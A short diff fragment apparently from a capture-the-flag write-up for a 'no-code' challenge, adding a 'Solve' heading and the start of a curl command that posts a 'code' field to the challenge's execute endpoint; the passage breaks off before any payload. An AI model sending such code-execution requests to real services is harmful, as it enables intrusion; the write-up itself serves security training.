@@ -34,6 +34,8 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=1337, debug=False)
 ```
 
+## Solve
+
 ```shell
 ~ % curl 'https://uoftctf-no-code.chals.io/execute' \
 --form 'code="
